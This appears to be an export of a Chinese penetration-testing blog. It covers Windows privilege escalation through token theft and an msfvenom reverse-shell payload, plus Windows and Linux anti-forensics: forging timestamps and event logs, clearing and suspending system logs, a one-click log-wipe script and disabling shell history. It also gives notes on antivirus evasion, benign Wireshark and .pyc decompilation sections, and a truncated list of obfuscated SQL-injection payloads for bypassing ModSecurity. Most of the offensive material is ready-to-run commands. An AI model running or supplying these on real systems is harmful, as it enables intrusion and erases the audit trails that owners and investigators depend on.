<p>如果CLSID默认的不行 可以换别的试试</p>
<p><img src="/posts/61d7ac81/9.png"></p>
<h5 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h5><ul>
<li>1.阻止攻击者获得SeImpersonate或者SeAssignPrimaryToken权限</li>
<li> 2.即使打好系统补丁</li>
<li> 3.升级到最新的windows系统</li>
</ul>
<h4 id="BadPotato"><a href="#BadPotato" class="headerlink" title="BadPotato"></a>BadPotato</h4><p><a href="https://github.com/hifuck/badpotato">https://github.com/hifuck/badpotato</a></p>
<h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p><code>BadPotato.exe whoami</code></p>
<p><img src="/posts/61d7ac81/10.png"></p>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><p>后续再补充~</p>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="incognito-exe"><a href="#incognito-exe" class="headerlink" title="incognito.exe"></a>incognito.exe</h4><p>下载地址 <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#列取token</span><br><span class="line">incognito.exe list_tokens -u</span><br><span class="line">#远程列举token</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot;  list_tokens -u</span><br><span class="line">#窃取到system权限</span><br><span class="line">incognito.exe  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">#降权至当前用户</span><br><span class="line">incognito.exe execute -c &quot;pte1-PC\pte1&quot; cmd.exe</span><br><span class="line">#远程窃取到system权限</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot; execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/11.png"></p>
<p><img src="/posts/61d7ac81/12.png"></p>
<p>ctrl+c 退出就能恢复原权限</p>
<h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><ul>
<li>1.生产shell</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.168.0.133 LPORT=3344 -f exe -o  shell.exe</code>  (弹shell也可以使用nishang 的 ps1脚本但是要求ps版本在3以上)</p>
<p><img src="/posts/61d7ac81/13.png"></p>
<ul>
<li>2.使用msf内置模块 incognito</li>
</ul>
<p><img src="/posts/61d7ac81/14.png"></p>
<ul>
<li>3.窃取token</li>
</ul>
<p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code> #窃取SYSTEM权限</p>
<p><code>steal_token 1252</code> 从进程中窃取</p>
<p><img src="/posts/61d7ac81/15.png"></p>
<ul>
<li>4.恢复到之前的权限</li>
</ul>
<p><code>rev2self</code></p>
<p><img src="/posts/61d7ac81/16.png"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><h4 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h4><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><h4 id="MS14-058"><a href="#MS14-058" class="headerlink" title="MS14-058"></a>MS14-058</h4><br>

<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h4><h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
<li>必须是root权限</li>
<li>secure_file_priv= </li>
<li>将udf.dll 文件上传到Mysql的plugins目录下</li>
</ul>
<p>具体可以参考<a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a></p>
<p>也可以使用udf大马</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>痕迹清理-Windows篇-01</title>
    <url>/posts/d8f69548/</url>
    <content><![CDATA[<h3 id="清理时间痕迹"><a href="#清理时间痕迹" class="headerlink" title="清理时间痕迹"></a>清理时间痕迹</h3><h4 id="伪造文件修改时间"><a href="#伪造文件修改时间" class="headerlink" title="伪造文件修改时间"></a>伪造文件修改时间</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">edit_time</span><span class="params">(<span class="variable">$path</span>)</span></span>&#123;<span class="variable">$date1</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date2</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date3</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastaccesstime=<span class="variable">$date1</span>.LastWriteTime;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).creationtime=<span class="variable">$date2</span>.LastWriteTime ;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastwritetime=<span class="variable">$date3</span>.LastWriteTime&#125;;</span><br><span class="line">edit_time(<span class="string">&quot;D:\test&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="伪造日志时间"><a href="#伪造日志时间" class="headerlink" title="伪造日志时间"></a>伪造日志时间</h4><p>使用eventcreate 详见下。</p>
<h3 id="清理用户痕迹"><a href="#清理用户痕迹" class="headerlink" title="清理用户痕迹"></a>清理用户痕迹</h3><h4 id="清理3389痕迹"><a href="#清理3389痕迹" class="headerlink" title="清理3389痕迹"></a>清理3389痕迹</h4><h3 id="清理操作痕迹"><a href="#清理操作痕迹" class="headerlink" title="清理操作痕迹"></a>清理操作痕迹</h3><h4 id="日志相关知识"><a href="#日志相关知识" class="headerlink" title="日志相关知识"></a>日志相关知识</h4><h5 id="产生流程"><a href="#产生流程" class="headerlink" title="产生流程"></a>产生流程</h5><ul>
<li><code>svchost.exe</code>（svchost.exe有些专门记录用于记录日志的线程启动日志记录功能）</li>
<li><code>内存堆</code>（记录的操作会缓存为一段内存内容）</li>
<li><code>wevtutil.exe</code>（将内存内容通过wevtutil.exe解析为xml文档）</li>
<li><code>日志</code>（将xml转换为可读的日志）</li>
</ul>
<h5 id="日志类型"><a href="#日志类型" class="headerlink" title="日志类型"></a>日志类型</h5><h6 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h6><p>位置 : <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
<p>安全相关的事件，如 用户权限变更登录、注销，文件/文件夹访问</p>
<h6 id="System"><a href="#System" class="headerlink" title="System"></a>System</h6><p>位置: <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p>系统进程、设备、磁盘活动等</p>
<h6 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h6><p>位置: <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p>包含操作系统安装的应用程序软件相关的事件</p>
<h6 id="应用程序及服务日志"><a href="#应用程序及服务日志" class="headerlink" title="应用程序及服务日志"></a>应用程序及服务日志</h6><p>远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志。</p>
<h5 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h5><p><code>eventvwr</code></p>
<h5 id="伪造日志"><a href="#伪造日志" class="headerlink" title="伪造日志"></a>伪造日志</h5><p><code>eventcreate</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br><span class="line"></span><br><span class="line">-t  warning &#x2F; error &#x2F; information &#x2F; success</span><br><span class="line">-id  1-1000</span><br><span class="line">-so 可以自定义  来源</span><br><span class="line">具体语法如下</span><br><span class="line">eventcreate [&#x2F;s Computer [&#x2F;u Domain\User [&#x2F;p Password]] &#123;[&#x2F;l &#123;APPLICATION|SYSTEM&#125;]|[&#x2F;so SrcName]&#125; &#x2F;t &#123;ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT&#125; &#x2F;id EventID &#x2F;d Description</span><br><span class="line"></span><br><span class="line">使用</span><br><span class="line">eventcreate -l system(日志类型) -so administrator（谁生成的） -t warning（等级） -d &quot;this is a test&quot;（日志内容） -id 500（id号）</span><br></pre></td></tr></table></figure>



<h4 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h4><ul>
<li>1.查看事件查看器—-手动清理</li>
<li>2.cmd命令删除日志</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el 列出系统中所有日志名称</span><br><span class="line">wevtutil cl system 清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security 清理安全日志</span><br></pre></td></tr></table></figure>

<p>凡是操作都会留下痕迹，哪怕是删除日志，也会留下一条删除日志的日志</p>
<ul>
<li>3.powershell命令删除</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 下面这个在powershell下运行 需要.net版本3.5</span><br><span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>4.msf删除日志</li>
</ul>
<p><code>meterpreter &gt; clearev</code></p>
<ul>
<li>5.单条日志的清理</li>
</ul>
<p>见下篇，主要参考三好学生大佬的文章[<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]</a>~</p>
<h4 id="停止记录日志"><a href="#停止记录日志" class="headerlink" title="停止记录日志"></a>停止记录日志</h4><h5 id="基于powershell"><a href="#基于powershell" class="headerlink" title="基于powershell"></a>基于powershell</h5><p>项目地址 <a href="https://github.com/hlldz/Phant0m">https://github.com/hlldz/Phant0m</a>  会直接杀掉线程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改powershell权限</span><br><span class="line">Get-ExecutionPolicy</span><br><span class="line">Set-ExecutionPolicy unrestricted</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-Phant0m.ps1</span><br><span class="line">Invoke-Phant0m</span><br><span class="line">#效果一般</span><br></pre></td></tr></table></figure>



<h5 id="基于C"><a href="#基于C" class="headerlink" title="基于C"></a>基于C</h5><p>项目地址 <a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a> 相比上面 这个可以暂停日志记录线程 也可以恢复线程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#暂停线程</span><br><span class="line">EventCleaner suspend</span><br><span class="line">#恢复线程</span><br><span class="line">EventCleaner normal</span><br></pre></td></tr></table></figure>







<h4 id="文件的覆写删除"><a href="#文件的覆写删除" class="headerlink" title="文件的覆写删除"></a>文件的覆写删除</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cipher &#x2F;W:D:\test 	</span><br><span class="line">#会对删除文件后留下的空间进行3此覆盖操作 先写入0x00 再写入0xFF 最后写入随意数字</span><br><span class="line"></span><br><span class="line">format G:&#x2F;P：4</span><br><span class="line">#对G盘数据进行格式化处理后进行4次覆写</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
      <tags>
        <tag>痕迹清理</tag>
      </tags>
  </entry>
  <entry>
    <title>痕迹清理-Linux篇</title>
    <url>/posts/1b08230/</url>
    <content><![CDATA[<h3 id="登录痕迹清理"><a href="#登录痕迹清理" class="headerlink" title="登录痕迹清理"></a>登录痕迹清理</h3><h4 id="基本的日志结构"><a href="#基本的日志结构" class="headerlink" title="基本的日志结构"></a>基本的日志结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp 记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure 记录与安全相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>

<h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"># 清除用户最后一次登录时间</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog </span><br><span class="line"># 清除安全日志记录</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># 清除系统日志记录</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># 清除当前登录用户的信息</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;utmp </span><br></pre></td></tr></table></figure>

<h4 id="删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip"><a href="#删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip" class="headerlink" title="删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip"></a>删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</h4><p><code>sed -i &#39;/自己的ip/&#39;d /var/log/messages</code></p>
<h4 id="全局替换自己ip"><a href="#全局替换自己ip" class="headerlink" title="全局替换自己ip"></a>全局替换自己ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
<p>前面是待替换ip 后面为替换后的ip</p>
<h3 id="时间痕迹清理"><a href="#时间痕迹清理" class="headerlink" title="时间痕迹清理"></a>时间痕迹清理</h3><p><code>ls -al</code> 可以查看创建时间</p>
<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch -r 目标时间的文件 需要修改时间的文件</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ： 仅修改access time</span><br><span class="line">-c ：仅修改时间，而不建立文件</span><br><span class="line">-d ：后面可以接日期，也可以使用 --date&#x3D;&quot;日期或时间&quot;</span><br><span class="line">-m ：仅修改mtime</span><br><span class="line">-t ：后面可以接时间，格式为 [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>

<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> 将当前系统日期修改为2014年07月12 18:30:50</p>
<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # –hctosys 将系统时钟调整为与目前的硬件时钟一致。</p>
<h3 id="操作痕迹清理"><a href="#操作痕迹清理" class="headerlink" title="操作痕迹清理"></a>操作痕迹清理</h3><h4 id="服务日志修改"><a href="#服务日志修改" class="headerlink" title="服务日志修改"></a>服务日志修改</h4><p># 使用grep -v来把我们的相关信息删除,</p>
<p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
<p># 把修改过的日志覆盖到原日志文件</p>
<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
<h4 id="history记录清理"><a href="#history记录清理" class="headerlink" title="history记录清理"></a>history记录清理</h4><ul>
<li>登录ssh后不记录history</li>
</ul>
<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
<ul>
<li>清理 <code>~/.bash_history</code></li>
<li><code>history -c </code></li>
<li><code>vim /etc/profile</code> 修改 <code>HISTSIZE=0</code></li>
</ul>
<h4 id="文件覆写"><a href="#文件覆写" class="headerlink" title="文件覆写"></a>文件覆写</h4><ul>
<li>单文件</li>
</ul>
<p><code>shred -f -u -z -v -n 8 1.txt</code></p>
<ul>
<li>文件夹</li>
</ul>
<p><code>wipe -r</code></p>
<h3 id="隐藏ssh登录记录"><a href="#隐藏ssh登录记录" class="headerlink" title="隐藏ssh登录记录"></a>隐藏ssh登录记录</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
<p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code></p>
<p><code>-o UserKnownHostsFile=/dev/null</code> #这个是knowhost的信息及公钥</p>
<p><code>-T user@host /bin/bash –i</code> #不分配伪终端但是给个bash的终端</p>
<h3 id="一键清除脚本"><a href="#一键清除脚本" class="headerlink" title="一键清除脚本"></a>一键清除脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
      <tags>
        <tag>痕迹清理</tag>
      </tags>
  </entry>
  <entry>
    <title>python_pyc反编译</title>
    <url>/posts/76fcd9b1/</url>
    <content><![CDATA[<p><a href="https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA">https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA</a></p>
<p>python  pyinstaller 打包exe免杀</p>
<h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p><code>https://www.virustotal.com/gui/file/8bc40da35383f54998be34e32c0ff22e25dd9c4c8f5df1c10e6f0bb9e431c8b0?nocache=1</code>    3/69</p>
<h3 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h3><p>使用py2exe 打包完文件后 会生成多个文件 二 pyinstaller 会生产一个exe</p>
<p><code>https://www.virustotal.com/gui/file/823d00a6d1ab82bbfaa5e997d5192b72cca7dba0e9b2d18d69ecf15e75fff9e7?nocache=1</code>  5/69</p>
<h3 id="反编译pyinstaller打包的exe文件"><a href="#反编译pyinstaller打包的exe文件" class="headerlink" title="反编译pyinstaller打包的exe文件"></a>反编译pyinstaller打包的exe文件</h3><p><a href="https://github.com/countercept/Python-exe-unpacker">https://github.com/countercept/Python-exe-unpacker</a></p>
<p>pyinstaller在打包pyc时，会去掉pyc的<code>magic</code>和<code>时间戳</code>。需要进行手工修复。pyinstaller在打包的系统库的时候是不会去掉magic的，所以查看一下系统库的magic即可</p>
<p>在将exe 转换为pyc文件有两种方法 如下</p>
<h4 id="将-exe-文件转换为-pyc-文件"><a href="#将-exe-文件转换为-pyc-文件" class="headerlink" title="将 exe 文件转换为 pyc 文件"></a>将 exe 文件转换为 pyc 文件</h4><h5 id="使用-pyinstxtractor-py"><a href="#使用-pyinstxtractor-py" class="headerlink" title="使用 pyinstxtractor.py"></a>使用 pyinstxtractor.py</h5><p><a href="https://sourceforge.net/projects/pyinstallerextractor/">https://sourceforge.net/projects/pyinstallerextractor/</a></p>
<p>将exe 和 pyinstxtractor.py 放在同一目录下</p>
<p><code>python pyinstxtractor.py test.exe</code></p>
<p>然后会生成</p>
<p><img src="/posts/76fcd9b1/1.PNG" alt="截图"></p>
<br>

<h5 id="使用pyi-archive-viewer"><a href="#使用pyi-archive-viewer" class="headerlink" title="使用pyi-archive_viewer"></a>使用pyi-archive_viewer</h5><p>二是使用pyi-archive_viewer命令（需要安装pyinstaller）</p>
<p><code>pyi-archive_viewer test.exe</code></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer1.PNG" alt="截图"></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer2.PNG" alt="截图"></p>
<p>这样会生成一个test2.pyc文件 然后恢复被pyinstaller 打包后删除的字节</p>
<h4 id="修复pyc-文件"><a href="#修复pyc-文件" class="headerlink" title="修复pyc 文件"></a>修复pyc 文件</h4><p>在<code>test.exe_extracted</code>文件下 存在struct 和 test 两文件<br><img src="/posts/76fcd9b1/3.PNG" alt="截图"></p>
<p>使用010editor打开 将struct的第一行插入到test的第一行<br><img src="/posts/76fcd9b1/4.PNG" alt="截图"><br><img src="/posts/76fcd9b1/5.PNG" alt="截图"></p>
<p>添加后<br><img src="/posts/76fcd9b1/6.PNG" alt="截图"><br> 另存为test.pyc即可</p>
<h4 id="将pyc文件转换为python代码"><a href="#将pyc文件转换为python代码" class="headerlink" title="将pyc文件转换为python代码"></a>将pyc文件转换为python代码</h4><h5 id="在线pyc反编译"><a href="#在线pyc反编译" class="headerlink" title="在线pyc反编译"></a>在线pyc反编译</h5><p> <a href="https://tool.lu/pyc">https://tool.lu/pyc</a></p>
<p><img src="/posts/76fcd9b1/7.PNG" alt="截图"></p>
<h5 id="使用-uncompyle6"><a href="#使用-uncompyle6" class="headerlink" title="使用 uncompyle6"></a>使用 <code>uncompyle6</code></h5><p> (需要使用pip 安装 <code>pip install uncompyle6</code>  但是不支持python3.9版本) </p>
<p><code>uncompyle6 test.pyc</code> 即可查看python代码<br><img src="/posts/76fcd9b1/8.PNG" alt="截图"><br>也可以将内容保存到test.py <code>uncompyle6 test.pyc &gt; test.py</code></p>
<p>踩坑：<br>（在使用时 由于本机内python环境比较复杂  有三个环境 结果搞得版本不统一 然后一直报错pyc的magic 失败 看了下<a href="https://fishc.com.cn/forum.php?mod=viewthread&tid=131172&highlight=pyc+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">https://fishc.com.cn/forum.php?mod=viewthread&amp;tid=131172&amp;highlight=pyc%2B%B7%B4%BB%E3%B1%E0</a> 意识到了这个问题） 在虚拟机上就可以成功避免这种问题</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/10450#toc-11">https://xz.aliyun.com/t/10450#toc-11</a></p>
<p><a href="https://fishc.com.cn/thread-131172-1-1.html">https://fishc.com.cn/thread-131172-1-1.html</a></p>
<p><a href="https://jishuin.proginn.com/p/763bfbd69fa1">https://jishuin.proginn.com/p/763bfbd69fa1</a></p>
<p><a href="https://www.cxymm.net/article/qq_36078992/103596170">https://www.cxymm.net/article/qq_36078992/103596170</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>wireshark学习-1</title>
    <url>/posts/6c4c4fdf/</url>
    <content><![CDATA[<h3 id="wireshark默认显示方式"><a href="#wireshark默认显示方式" class="headerlink" title="wireshark默认显示方式"></a>wireshark默认显示方式</h3><p><img src="/posts/6c4c4fdf/1.png" alt="截图"></p>
<h3 id="wireshark中-默认的列"><a href="#wireshark中-默认的列" class="headerlink" title="wireshark中 默认的列"></a>wireshark中 默认的列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No. ：捕获的数据帧序号，第一帧始终为 1。</span><br><span class="line">Time ：从捕获的第一帧开始的计算的时间（单位为纳秒），第一帧标记为 0.000000。</span><br><span class="line">Source ：源地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Destination ：目的地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Protocol ：以太网帧、IP数据包、TCP分片所使用的协议（ARP、DNS、TCP、HTTP等）。</span><br><span class="line">Length ：数据帧长度（单位为字节）。</span><br></pre></td></tr></table></figure>

<h4 id="隐藏不需要的列"><a href="#隐藏不需要的列" class="headerlink" title="隐藏不需要的列"></a>隐藏不需要的列</h4><p>可以通过右键标题栏 选择隐藏不需要的列</p>
<h4 id="删除不需要的列"><a href="#删除不需要的列" class="headerlink" title="删除不需要的列"></a>删除不需要的列</h4><p>如果有些列用不到 可以选择该列后右键 -&gt; Remove This Column 进行删除</p>
<h4 id="添加需要的列"><a href="#添加需要的列" class="headerlink" title="添加需要的列"></a>添加需要的列</h4><p>右键点击标题栏 选择<code>Column Preferences</code> 点击左下角的 <code>+</code>  列表中将会出现一个标题为New Column的表项。</p>
<h4 id="修改时间格式"><a href="#修改时间格式" class="headerlink" title="修改时间格式"></a>修改时间格式</h4><p>点击菜单栏的 <code>视图</code> 选择 <code>时间显示格式</code> 可以去选择<code>UTC</code> 秒等</p>
<h4 id="添加自定义列"><a href="#添加自定义列" class="headerlink" title="添加自定义列"></a>添加自定义列</h4><p>可以选择数据包细节窗口 选择需要添加的数据 右键点击应用为列 即可成功添加</p>
<hr>
<p>背景为红色 =&gt; 这个表达式尚未被接受</p>
<p>背景为绿色 =&gt; 这个表达式可以正常工作</p>
<p>背景为黄色 =&gt; 这个表达式可以被接受，但是可能不会按预期工作</p>
<br>

<p>wireshark 显示过滤器   布尔表达式</p>
<ul>
<li>等于        ==  或 eq</li>
<li>且            &amp;&amp; 或 and</li>
<li>或             ||       或 or</li>
</ul>
<br>

<p>eg</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.addr eq 192.168.10.195 and ip.addr &#x3D;&#x3D; 192.168.10.1</span><br><span class="line"></span><br><span class="line">http.request &amp;&amp; ip.addr &#x3D;&#x3D; 192.168.10.195</span><br><span class="line"></span><br><span class="line">http.request || http.response</span><br><span class="line"></span><br><span class="line">dns.qry.name contains microsoft or dns.qry.name contains windows</span><br></pre></td></tr></table></figure>

<br>

<p>选择排除特定值时 不要在表达式中使用 != </p>
<p>可以使用<code>!(ip.addr == 192.168.10.1)</code>  而不是使用<code>ip.addr != 192.168.10.1</code></p>
<br>

<p><code>http.request or ssl.handshake.type == 1</code></p>
<p><code>http.request</code>  </p>
<p><code>ssl.handshake.type == 1</code></p>
<br>

<hr>
<h3 id="识别主机和用户"><a href="#识别主机和用户" class="headerlink" title="识别主机和用户"></a>识别主机和用户</h3><h4 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h4><br>

<h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4>]]></content>
  </entry>
  <entry>
    <title>Modsecuity_bypass</title>
    <url>/posts/1460cbad/</url>
    <content><![CDATA[<h3 id="Union-Select"><a href="#Union-Select" class="headerlink" title="Union Select"></a>Union Select</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!50000%55nIoN*&#x2F; &#x2F;*!50000%53eLeCt*&#x2F;</span><br><span class="line">%55nion(%53elect 1,2,3)-- -</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!12345UNION SELECT*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!50000UNION SELECT*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;**&#x2F;UNION&#x2F;**&#x2F;&#x2F;*!50000SELECT*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*!50000UniON SeLeCt*&#x2F;</span><br><span class="line">union &#x2F;*!50000%53elect*&#x2F;</span><br><span class="line">+ #?uNiOn + #?sEleCt</span><br><span class="line">+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">&#x2F;*!%55NiOn*&#x2F; &#x2F;*!%53eLEct*&#x2F;</span><br><span class="line">&#x2F;*!u%6eion*&#x2F; &#x2F;*!se%6cect*&#x2F;</span><br><span class="line">+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect</span><br><span class="line">uni%0bon+se%0blect</span><br><span class="line">%2f**%2funion%2f**%2fselect</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">REVERSE(noinu)+REVERSE(tceles)</span><br><span class="line">&#x2F;*--*&#x2F;union&#x2F;*--*&#x2F;select&#x2F;*--*&#x2F;</span><br><span class="line">union (&#x2F;*!&#x2F;**&#x2F; SeleCT *&#x2F; 1,2,3)</span><br><span class="line">&#x2F;*!union*&#x2F;+&#x2F;*!select*&#x2F;</span><br><span class="line">union+&#x2F;*!select*&#x2F;</span><br><span 